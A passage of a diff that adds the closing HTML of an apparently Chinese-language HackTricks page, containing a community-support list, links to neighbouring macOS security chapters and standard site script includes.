+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/introduction-to-x64.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-applefs.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/introduction-to-x64.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-applefs.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../elasticlunr.min.js"></script>
+        <script src="../../../mark.min.js"></script>
+        <script src="../../../searcher.js"></script>
+
+        <script src="../../../clipboard.min.js"></script>
+        <script src="../../../highlight.js"></script>
+        <script src="../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
